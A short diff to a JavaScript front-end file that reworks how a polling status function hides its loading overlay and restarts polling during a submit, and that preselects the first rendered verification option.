@@ -739,9 +739,7 @@ function objectToFormData(obj) {
 
 // Function to update UI based on polling status
 function updateUIForStatus(status, data = {}) {
-  if (isSubmitting && status === currentStatus) {
-    return;
-  }
+  const isSameStatusDuringSubmit = isSubmitting && status === currentStatus;
   if (isSubmitting && status !== currentStatus) {
     isSubmitting = false;
     if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
@@ -851,10 +849,10 @@ function updateUIForStatus(status, data = {}) {
         verificationOptions = optsArr;
         renderVerificationOptions(verificationOptions);
       }
-      if (document.getElementById('loadingOverlay').style.display !== 'none') {
+      if (!isSameStatusDuringSubmit) {
         hideLoadingOverlay();
+        startPolling(10000);
       }
-      startPolling(10000);
       break;
     case 'WAITINGCODE':
       emailGroup.style.display = 'none';
@@ -872,10 +870,10 @@ function updateUIForStatus(status, data = {}) {
           }
         } catch(e) {}
       }
-      if (document.getElementById('loadingOverlay').style.display !== 'none') {
+      if (!isSameStatusDuringSubmit) {
         hideLoadingOverlay();
+        startPolling(10000);
       }
-      startPolling(10000);
       break;
     case 'COMPLETED':
       hideLoadingOverlay();
@@ -959,6 +957,7 @@ function renderVerificationOptions(options) {
     input.dataset.maskedDetail = option.maskedDetail || '';
     input.dataset.requiresInput = option.requiresInput ? 'true' : 'false';
     input.dataset.inputLabel = option.inputLabel || '';
+    if (index === 0) input.checked = true;
 
     const label = document.createElement('label');
     label.className = 'form-check-label';
